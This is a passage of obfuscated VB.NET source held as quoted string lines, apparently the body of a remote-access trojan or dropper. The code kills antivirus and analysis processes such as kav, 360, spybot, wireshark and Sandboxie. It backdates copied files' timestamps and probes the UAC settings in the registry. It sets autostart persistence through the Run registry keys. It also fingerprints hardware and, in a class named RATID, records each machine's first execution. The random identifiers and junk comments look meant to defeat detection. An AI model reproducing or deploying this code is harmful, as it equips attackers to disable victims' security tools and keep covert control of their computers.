            "\t\t\t\t\t\tHHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi(New String(){GoqLnsGQlymYzWVwevhlMlxrJHdyXQMXoEZMWtoSUzUZhXDMNL.Name})",
            "\t\t\t\t\tEnd If",
            "\t\t\t\t\tGoqLnsGQlymYzWVwevhlMlxrJHdyXQMXoEZMWtoSUzUZhXDMNL.Attributes = System.IO.FileAttributes.Normal",
            "\t\t\t\t\tGoqLnsGQlymYzWVwevhlMlxrJHdyXQMXoEZMWtoSUzUZhXDMNL.Delete()",
            "\t\t\t\tEnd If",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "' WBZqDroiBxVFPVRdtuQSbyfJZGMfncIEEDHslsXxjyDGxWzeOK",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "\t\tPublic Shared Function HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi(ByVal FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuessNames As System.Collections.ArrayList, Optional Byval NqrYsxGvbkkjoLSZERQgjmeDSLudfzchuranNNowKlFkJaBbmg As Boolean = True)  As Boolean",
            "\t\t\tReturn HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi(Ctype(FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuessNames.ToArray(GetType(String)), String()), NqrYsxGvbkkjoLSZERQgjmeDSLudfzchuranNNowKlFkJaBbmg)",
            "\t\tEnd Function",
            "\t\tPublic Shared Function HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi(Optional ByVal FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuessNames As String() = Nothing, Optional Byval NqrYsxGvbkkjoLSZERQgjmeDSLudfzchuranNNowKlFkJaBbmg As Boolean = True)  As Boolean",
            "\t\t\tDim DqoiBxUqPURcfuQRakfJYrLeZOtDECHrksWjiyDFwWldOvxSuzID = System.Diagnostics.Process.GetCurrentProcess().Id",
            "\t\t\tDim CcOehkcBeJsodxofsDmlZLmJVjRiUYymkewtQlKQMYbqMNWgbF As New System.Collections.ArrayList",
            "\t\t\tDim UmHaVKpyzxDngnSfeuyBsSgZKrtOqvJUoCpbDZYzhykoPpBuNK As String = \"werfault,360,beat,dw20,dwwin,kav,malware,ntvdm,pcts,QQPC,Sbie,spybot,wireshark,dwwin\"",
            "\t\t\tIf UmHaVKpyzxDngnSfeuyBsSgZKrtOqvJUoCpbDZYzhykoPpBuNK.Length > 0 Then",
            "\t\t\t\tCcOehkcBeJsodxofsDmlZLmJVjRiUYymkewtQlKQMYbqMNWgbF.AddRange(Split(UmHaVKpyzxDngnSfeuyBsSgZKrtOqvJUoCpbDZYzhykoPpBuNK, \",\"))",
            "\t\t\tEnd If",
            "\t\t\tIf FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuessNames isNot Nothing Then CcOehkcBeJsodxofsDmlZLmJVjRiUYymkewtQlKQMYbqMNWgbF.AddRange(FXrLFuajkinYRYDQPfildDRKuceybgtEZmaMnKJkSjVZzalfxuessNames)",
            "' MJrFeeGOaDWCZrRrDwPyVFQVSduJRSbzuXZGMfndJEFDIszHXy",
            "\t\t\tDim WmceWvYDBiXriZmxgfTTuDPrLqPgsgeYqnKtFLHSjkGHRoVyOu() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcesses()",
            "\t\t\tFor Each BUcSxstrwhbiMnYosumMoTEznJypEOwwjWwTgubsfjJwuoHEaw As System.Diagnostics.Process In WmceWvYDBiXriZmxgfTTuDPrLqPgsgeYqnKtFLHSjkGHRoVyOu",
            "\t\t\t\tIf BUcSxstrwhbiMnYosumMoTEznJypEOwwjWwTgubsfjJwuoHEaw.Id = DqoiBxUqPURcfuQRakfJYrLeZOtDECHrksWjiyDFwWldOvxSuzID Then Continue For\t' ZKRYoPPeUXPnRvtbQkbSfpZYMMnvIkEjHZlZXRjgDmxDzLcdyz",
            "\t\t\t\t",
            "' JhOrHntNVLqlmkpaTaFfRhlnfFhMwrgBrivHpocOpMYmUlXbCp",
            "\t\t\t\tFor Each ZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ As String In CcOehkcBeJsodxofsDmlZLmJVjRiUYymkewtQlKQMYbqMNWgbF",
            "\t\t\t\t\tZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ = System.IO.Path.GetFileNameWithoutExtension(ZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ)",
            "\t\t\t\t\tIf ZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ.Length = 0 Then Continue For",
            "\t\t\t\t\tDim sKvzaOMGYVrNmrozDSnoxIDgvPiCwlRabZePIPtHGWacUtJBlT As Boolean = false",
            "\t\t\t\t\tIf ZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ.Length >= 3 Then",
            "\t\t\t\t\t\tIf BUcSxstrwhbiMnYosumMoTEznJypEOwwjWwTgubsfjJwuoHEaw.ProcessName().ToLower.StartsWith(ZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ.ToLower) Then sKvzaOMGYVrNmrozDSnoxIDgvPiCwlRabZePIPtHGWacUtJBlT = True",
            "\t\t\t\t\tElse",
            "\t\t\t\t\t\tIf BUcSxstrwhbiMnYosumMoTEznJypEOwwjWwTgubsfjJwuoHEaw.ProcessName().ToLower = ZTliGbzGCORfBDMWQtKcwQKzfoonrdWdIUUknqiHWPygjEgkyJ.ToLower Then sKvzaOMGYVrNmrozDSnoxIDgvPiCwlRabZePIPtHGWacUtJBlT = True",
            "\t\t\t\t\tEnd If",
            "\t\t\t\t\tIf NqrYsxGvbkkjoLSZERQgjmeDSLudfzchuranNNowKlFkJaBbmg And sKvzaOMGYVrNmrozDSnoxIDgvPiCwlRabZePIPtHGWacUtJBlT Then",
            "\t\t\t\t\t\tDim PUserName As String = \"\"",
            "\t\t\t\t\t\tPUserName = ulzKssfSsPcqXobfFsqkDzWsRXTehwSTdmhLatOgbRwFGEJunu(BUcSxstrwhbiMnYosumMoTEznJypEOwwjWwTgubsfjJwuoHEaw) ",
            "\t\t\t\t\t\tIf PUserName <> \"\"",
            "\t\t\t\t\t\t\tIf PUserName.ToLower.StartsWith(\"system\") Then sKvzaOMGYVrNmrozDSnoxIDgvPiCwlRabZePIPtHGWacUtJBlT = False",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tEnd If",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\tIf sKvzaOMGYVrNmrozDSnoxIDgvPiCwlRabZePIPtHGWacUtJBlT Then ",
            "\t\t\t\t\t\t\tBUcSxstrwhbiMnYosumMoTEznJypEOwwjWwTgubsfjJwuoHEaw.Kill()",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tCatch ex As System.Exception",
            "' XClhWqhXlveeREfCOcKbNRrfcWolJeDJFRUiEGPZUxNfzTNDir",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tNext",
            "\t\t\tNext",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function ulzKssfSsPcqXobfFsqkDzWsRXTehwSTdmhLatOgbRwFGEJunu(ByVal Process As System.Diagnostics.Process) As String",
            "\t\t\tTry",
            "\t\t\t\tDim sq As New System.Management.ObjectQuery(\"Select * from Win32_Process Where ProcessID = '\" & Process.Id & \"'\")",
            "\t\t\t\tDim searcher As New System.Management.ManagementObjectSearcher(sq)",
            "\t\t\t\tIf searcher.Get.Count = 0 Then Return \"\"",
            "\t\t\t\tFor Each oReturn As System.Management.ManagementObject In searcher.Get",
            "\t\t\t\t\tDim o As String() = New String(1) {}",
            "\t\t\t\t\toReturn.InvokeMethod(\"GetOwner\", DirectCast(o, Object()))",
            "\t\t\t\t\tReturn o(0)",
            "\t\t\t\tNext",
            "\t        Catch ex As System.Exception",
            "' HuEbWzCiDIQGltusxVcjOaaptwnNcVFmpKmqFBkxXXxHTvPuSk",
            "\t\t\tEnd Try",
            "\t\t\tReturn \"\"",
            "\t\tEnd Function",
            "\t\tPublic Shared Function KkvpIrOxIOKWnCKLUrmQSyFYgWCwxvBlszQqqGwyqQsXVDrMDt(ByVal HSBznnPXjMfLiBNBysLIeOZebmEFabkJpTiPVowmSNOMRCuCgI As String, ByVal fuyCtSvaKGuPFvKUDDpcEamBizlpPEBuNKhDbhdpsHcenxsVlE As String) As Boolean",
            "\t\t\tIf HSBznnPXjMfLiBNBysLIeOZebmEFabkJpTiPVowmSNOMRCuCgI.ToLower = fuyCtSvaKGuPFvKUDDpcEamBizlpPEBuNKhDbhdpsHcenxsVlE.ToLower Then Return False",
            "\t\t\tIf HSBznnPXjMfLiBNBysLIeOZebmEFabkJpTiPVowmSNOMRCuCgI.Length = 0 Or fuyCtSvaKGuPFvKUDDpcEamBizlpPEBuNKhDbhdpsHcenxsVlE.Length = 0 Then Return False",
            "\t\t\tDim WHzHlMxORUMlOsdYNhYPcnWVJuWsFTBSEIiWUOgdzWuzwILavw, GQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ As System.IO.FileInfo",
            "\t\t\tTry",
            "\t\t\t\tWHzHlMxORUMlOsdYNhYPcnWVJuWsFTBSEIiWUOgdzWuzwILavw = New System.IO.FileInfo(HSBznnPXjMfLiBNBysLIeOZebmEFabkJpTiPVowmSNOMRCuCgI)",
            "\t\t\t\tGQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ = New System.IO.FileInfo(fuyCtSvaKGuPFvKUDDpcEamBizlpPEBuNKhDbhdpsHcenxsVlE)",
            "\t\t\t\tIf Not GQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ.Directory.Exists Then GQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ.Directory.Create()",
            "\t\t\t\tIf GQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ.Exists Then",
            "\t\t\t\t\tCall zOvNyDcROIaXuQouqCGUprBLFiyRlFyoUddcgSLSwJJYcfXvLE(GQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ)",
            "\t\t\t\tEnd If",
            "\t\t\t\tWHzHlMxORUMlOsdYNhYPcnWVJuWsFTBSEIiWUOgdzWuzwILavw.CopyTo(fuyCtSvaKGuPFvKUDDpcEamBizlpPEBuNKhDbhdpsHcenxsVlE, True)",
            "\t\t\t\tGQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ = New System.IO.FileInfo(fuyCtSvaKGuPFvKUDDpcEamBizlpPEBuNKhDbhdpsHcenxsVlE)",
            "\t\t\t\tGQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ.CreationTimeUtc\t\t\t= DateTime.Today.AddYears(-1)",
            "\t\t\t\tGQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ.LastAccessTimeUtc\t\t= DateTime.Today.AddYears(-1)",
            "\t\t\t\tGQLoEXqKFtZijhmXQXCPOeikcCRJtbdxaftEYlZLmJIjRiVZyZ.LastWriteTimeUtc\t\t\t= DateTime.Today.AddYears(-1)",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function mMoTRznIypEOwvjjLTfIbzXpCpnhzwTDOTQbstPQZxeIXEKdlb() As Boolean",
            "\t\t\tDim hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX As Microsoft.Win32.RegistryKey",
            "\t\t\tDim hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue As String",
            "\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\", True)",
            "\t\t\tTry",
            "\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue = hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX.GetValue(\"EnableLUA\")",
            "\t\t\t\tIf hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue = \"0\" or hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue is Nothing Then",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX.SetValue(\"EnableUninstallerDetection\", 0)",
            "\t\t\t\t\t\tReturn False",
            "\t\t\t\t\tCatch ex As System.Exception",
            "\t\t\t\t\t\tReturn True",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tElse",
            "\t\t\t\t\tReturn True",
            "\t\t\t\tEnd If",
            "\t\t\tCatch ex As System.Exception",
            "' EUXaSqGyiRTnQVisObPBcyxZHYKOoOZTliGbzsozRfBoyWRuvc",
            "\t\t\t\tReturn True",
            "\t\t\tEnd Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function wCKzfoonsPWdIVUknqiHWPyhjEglyverRRsBOpJoNeFfqkDlIr(ByVal KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath As String) As String",
            "\t\t\tIf KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Length = 0 Then Return \"\"",
            "\t\t\tIf mMoTRznIypEOwvjjLTfIbzXpCpnhzwTDOTQbstPQZxeIXEKdlb Then",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%COMMONPROGRAMFILES%\",\"%APPDATA%\")",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%PROGRAMFILES%\",\"%APPDATA%\")",
            "\t\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%WINDIR%\",\"%APPDATA%\")",
            "\t\t\tEnd If",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%COMMONPROGRAMFILES%\", System.Environment.GetEnvironmentVariable(\"COMMONPROGRAMFILES\"))",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%PROGRAMFILES%\", System.Environment.GetEnvironmentVariable(\"PROGRAMFILES\"))",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%APPDATA%\", System.Environment.GetEnvironmentVariable(\"APPDATA\"))",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%WINDIR%\", System.Environment.GetEnvironmentVariable(\"WINDIR\"))",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"%TEMP%\", System.Environment.GetEnvironmentVariable(\"TEMP\"))",
            "\t\t\tKgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath = KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath.Replace(\"\\\\\", \"\\\")",
            "\t\t\tReturn KgsHoGswWKICURnKiokvyOjktEycrLexshNWXVaLFMpDCSWYQpath",
            "\t\tEnd Function",
            "\t\tPublic Shared Function gNTmujQLLKPzszeFqHKNFdHlVRGaRIVfOOCnPlxMtLwBbPMGYW(ByVal eBZfbmpFablupTiCWojZFNOMRDvDgtsJNQHgvoYGJdGKYiDREq As String, ByVal RnmPwOzEdEPJbYuRphdpHVqenLGjlSmrzpVeechFMTxKKZdgYw As String, Optional ByVal MFoWZtWaaXGTssUcpRlQoGgHSMeNjTekgrJYfhqOJmoVbuDrXT As Boolean = True, Optional ByVal TSWIOVmNMcSVNlPtrZOiYPdnWWJJktGhCgFXiXUOgdBkuBwJZa As Boolean = false) As Boolean",
            "\t\t\tIf eBZfbmpFablupTiCWojZFNOMRDvDgtsJNQHgvoYGJdGKYiDREq.Length = 0 Then Return False",
            "\t\t\tIf RnmPwOzEdEPJbYuRphdpHVqenLGjlSmrzpVeechFMTxKKZdgYw.Length = 0 Then Return False",
            "\t\t\tDim hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX As Microsoft.Win32.RegistryKey",
            "\t\t\tDim hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue As String",
            "\t\t\tTry",
            "\t\t\t\tIf mMoTRznIypEOwvjjLTfIbzXpCpnhzwTDOTQbstPQZxeIXEKdlb() Then",
            "\t\t\t\t\tIf MFoWZtWaaXGTssUcpRlQoGgHSMeNjTekgrJYfhqOJmoVbuDrXT Then",
            "\t\t\t\t\t\tMFoWZtWaaXGTssUcpRlQoGgHSMeNjTekgrJYfhqOJmoVbuDrXT = False",
            "\t\t\t\t\t\tTSWIOVmNMcSVNlPtrZOiYPdnWWJJktGhCgFXiXUOgdBkuBwJZa = True",
            "\t\t\t\t\tEnd If",
            "\t\t\t\tEnd If",
            "\t\t\t\tIf MFoWZtWaaXGTssUcpRlQoGgHSMeNjTekgrJYfhqOJmoVbuDrXT Then",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", True)",
            "\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue = hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX.GetValue(eBZfbmpFablupTiCWojZFNOMRDvDgtsJNQHgvoYGJdGKYiDREq, \"null\")",
            "\t\t\t\t\t\tIf hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue Is Nothing Or hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue <> RnmPwOzEdEPJbYuRphdpHVqenLGjlSmrzpVeechFMTxKKZdgYw OR hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue = \"null\" Then",
            "\t\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX.SetValue(eBZfbmpFablupTiCWojZFNOMRDvDgtsJNQHgvoYGJdGKYiDREq, RnmPwOzEdEPJbYuRphdpHVqenLGjlSmrzpVeechFMTxKKZdgYw)",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tCatch ex As System.Exception",
            "\t\t\t\t\t\tTSWIOVmNMcSVNlPtrZOiYPdnWWJJktGhCgFXiXUOgdBkuBwJZa = True",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tEnd If",
            "\t\t\t\tIf TSWIOVmNMcSVNlPtrZOiYPdnWWJJktGhCgFXiXUOgdBkuBwJZa Then",
            "\t\t\t\t\tTry",
            "\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", True)",
            "\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue = hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX.GetValue(eBZfbmpFablupTiCWojZFNOMRDvDgtsJNQHgvoYGJdGKYiDREq, \"null\")",
            "\t\t\t\t\t\tIf hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue Is Nothing Or hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue <> RnmPwOzEdEPJbYuRphdpHVqenLGjlSmrzpVeechFMTxKKZdgYw OR hOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaXValue = \"null\" Then",
            "\t\t\t\t\t\t\thOUnvlRMNLQBIPfHGWMOGfImkTHcSJXhQQDDemzbuayQcQOIaX.SetValue(eBZfbmpFablupTiCWojZFNOMRDvDgtsJNQHgvoYGJdGKYiDREq, RnmPwOzEdEPJbYuRphdpHVqenLGjlSmrzpVeechFMTxKKZdgYw)",
            "\t\t\t\t\t\tEnd If",
            "\t\t\t\t\tCatch ex As System.Exception",
            "' LkvpIFcxWPLWnCXLVsnRSyTYgWCLLKPmszerqHKNFdslWEGaDI",
            "\t\t\t\t\tEnd Try",
            "\t\t\t\tEnd If",
            "\t\t\tCatch ex As System.Exception",
            "' VSBOnnPXkMgLjBbCNHZIeOZfbmETablJEhjQWpxmSOOMRDJQhI",
            "\t\t\t\tReturn false",
            "\t\t\tEnd Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Shared Function tJyCtTvaYGuPGwKUEDqqSamPiOlEQECvOLhRchepHIdenMsWlS(ByVal len As Integer) As String",
            "\t\t\tRandomize()",
            "\t\t\tDim s As New System.Text.StringBuilder(\"\")",
            "\t\t\tDim b() As Char = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\".ToCharArray()",
            "\t\t\tFor i As Integer = 1 To len",
            "\t\t\t\tRandomize()",
            "\t\t\t\tDim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1",
            "\t\t\t\ts.Append(b(z))",
            "\t\t\tNext",
            "\t\t\tReturn s.ToString",
            "\t\tEnd Function",
            "\t\t    Public Shared Function IsVCRunning() As Boolean",
            "        Try",
            "            Dim ProcessNames As String() = {\"NeroCheck\", \"lsasss\"}",
            "            For Each aProcessName As String In ProcessNames",
            "                If System.Diagnostics.Process.GetProcessesByName(aProcessName).Length >= 1 Then",
            "                    Return True",
            "                End If",
            "            Next",
            "        Catch ex As Exception",
            "        End Try",
            "        Return False",
            "    End Function",
            "\tEnd Class",
            "' RksiOJJINxqxcDoFILDbFjTPEYPGTdNMzlNjvKrJuyZNLFXUqM",
            "' lqmyCRmnwHCfuOhBvkQZaYdOHOsGFVZbTsIzkSUoRWjuPcQCdz",
            "Public Class HardwareID",
            "' kNuMxCbCNHZWtPnfcnFToclKEhjQkpxnTccbfDKRvIIYbeWuKD",
            "    Public Shared Function MD5CalcString(ByVal strData As String) As String",
            "        Dim objMD5 As New System.Security.Cryptography.MD5CryptoServiceProvider",
            "        Dim arrData() As Byte",
            "        Dim arrHash() As Byte",
            "        arrData = System.Text.Encoding.UTF8.GetBytes(strData)",
            "        arrHash = objMD5.ComputeHash(arrData)",
            "        objMD5 = Nothing",
            "        Return ByteArrayToString(arrHash)",
            "    End Function",
            "    Public Shared Function ByteArrayToString(ByVal arrInput() As Byte) As String",
            "        Dim strOutput As New System.Text.StringBuilder(arrInput.Length)",
            "        For i As Integer = 0 To arrInput.Length - 1",
            "            strOutput.Append(arrInput(i).ToString(\"X2\"))",
            "        Next",
            "        Return strOutput.ToString().ToLower",
            "    End Function",
            "' mUXrUYmjSfFFgoBdwcBSrSdXpZvfqvsEVjrsCaVxzgmGOEjefd",
            "    Public Shared Function Generate() As String",
            "\t\tDim str As String = GetMACAddress() & GetVolumeSerial() & GetHDID()",
            "\t\tDim ret As String = MD5CalcString(str).ToUpper",
            "' iTahxZYoegYxaFDlZukbpziiVVwFStNsRiuigaspMvHNJUlmIJ",
            "        Return ret",
            "    End Function",
            "    Public Shared Function GetProcessorId() As String",
            "        Dim strProcessorId As String = String.Empty",
            "        Dim query As New System.Management.SelectQuery(\"Win32_processor\")",
            "        Dim search As New System.Management.ManagementObjectSearcher(query)",
            "        Dim info As System.Management.ManagementObject",
            "        For Each info In search.Get()",
            "            strProcessorId = info(\"processorId\").ToString()",
            "        Next",
            "        Return strProcessorId",
            "    End Function",
            "    Public Shared Function GetMACAddress() As String",
            "        Dim mc As System.Management.ManagementClass = New System.Management.ManagementClass(\"Win32_NetworkAdapterConfiguration\")",
            "        Dim moc As System.Management.ManagementObjectCollection = mc.GetInstances()",
            "        Dim MACAddress As String = String.Empty",
            "        For Each mo As System.Management.ManagementObject In moc",
            "            If (MACAddress.Equals(String.Empty)) Then",
            "                If CBool(mo(\"IPEnabled\")) Then MACAddress = mo(\"MacAddress\").ToString()",
            "                mo.Dispose()",
            "            End If",
            "            MACAddress = MACAddress.Replace(\":\", String.Empty)",
            "        Next",
            "        Return MACAddress",
            "    End Function",
            "    Public Shared Function GetVolumeSerial(Optional ByVal strDriveLetter As String = \"C\") As String",
            "        Dim disk As System.Management.ManagementObject = New System.Management.ManagementObject(String.Format(\"win32_logicaldisk.deviceid=\"\"{0}:\"\"\", strDriveLetter))",
            "        disk.Get()",
            "        Return disk(\"VolumeSerialNumber\").ToString()",
            "    End Function",
            "    Public Shared Function GetMotherBoardID() As String",
            "        Dim strMotherBoardID As String = String.Empty",
            "        Dim query As New System.Management.SelectQuery(\"Win32_BaseBoard\")",
            "        Dim search As New System.Management.ManagementObjectSearcher(query)",
            "        Dim info As System.Management.ManagementObject",
            "        For Each info In search.Get()",
            "            strMotherBoardID = info(\"SerialNumber\").ToString()",
            "        Next",
            "        Return strMotherBoardID",
            "    End Function",
            "    Public Shared Function GetHDID() As String",
            "        Dim temp As String = String.Empty",
            "        Dim ms As New System.Management.ManagementScope(\"\\\\\" & Environment.MachineName & \"\\root\\cimv2\")",
            "        Dim sq As New System.Management.SelectQuery(\"SELECT * FROM WIN32_DiskDrive\")",
            "        Dim mos As New System.Management.ManagementObjectSearcher(ms, sq)",
            "        For Each mo As System.Management.ManagementObject In mos.Get()",
            "            For Each prop As System.Management.PropertyData In mo.Properties",
            "                If Not prop.Value Is Nothing AndAlso prop.Name = \"Signature\" Then",
            "                    temp = prop.Value.ToString()",
            "                    Return temp",
            "                    Exit For",
            "                End If",
            "            Next",
            "        Next",
            "        Return temp",
            "    End Function",
            "End Class",
            "' FcKnDjpJRGmhhglWPWBbNdgjbzdIrncwnerCkkYKlIUiQhTXxl",
            "' icusPkJPLXaoLMVfaETlGZTJoxywCmfmRedtwzrRfYJqsNpuIS",
            "    Public Class RATID",
            "        Dim IDs As New System.Collections.ArrayList",
            "        Sub New()",
            "            IDs.Add(\"Tencent\")",
            "            IDs.Add(\"_GLOBAL\")",
            "            IDs.Add(\"_PUBLIC\")",
            "            IDs.Add(\"_SHARE0131\")",
            "            IDs.Add(\"_SHARE0123\")",
            "            IDs.Add(\"_PUBLIC0111\")",
            "            IDs.Add(\"_SHARE0108\")",
            "            IDs.Add(\"_PUBLIC1218\")",
            "            IDs.Add(\"_PUBLIC1221\")",
            "            IDs.Add(\"_PUBLIC1223\")",
            "            IDs.Add(\"_SHARE1223\")",
            "            IDs.Add(\"_PUBLIC1229\")",
            "            IDs.Add(\"Public\")",
            "            IDs.Add(\"TMP\")",
            "        End Sub",
            "\t\tSub New(ByVal _ids As String())",
            "\t\t\tCall myBase.New()",
            "\t\t\tIDs.InsertRange(0, _ids)",
            "\t\tEnd Sub",
            "\t\tSub New(ByVal _id As String)",
            "\t\t\tCall myBase.New()",
            "\t\t\tIDs.Insert(0, _id)",
            "\t\tEnd Sub",
            "        Public Function GetVolumeSerial(Optional ByVal strDriveLetter As String = \"C\") As String",
            "            Try",
            "                Dim disk As System.Management.ManagementObject = New System.Management.ManagementObject(String.Format(\"win32_logicaldisk.deviceid=\"\"{0}:\"\"\", strDriveLetter))",
            "                disk.Get()",
            "                Return disk(\"VolumeSerialNumber\").ToString()",
            "            Catch ex As Exception",
            "                Return \"\"",
            "            End Try",
            "        End Function",
            "        Public Function GetFirstExecution() As DateTime",
            "            Dim FirstExecution_dt As DateTime = DateTime.Now",
            "            For Each id As String In IDs",
            "                Try",
            "                    Dim rk As Microsoft.Win32.RegistryKey",
            "                    rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\"Software\\\" & id, True)",
            "                    Dim dt As DateTime = StrToDateTime(rk.GetValue(\"FirstExecution\"))",
            "                    If FirstExecution_dt > dt Then",
            "                        FirstExecution_dt = dt",
            "                    End If",
            "                    rk.Close()",
            "                Catch ex As Exception",
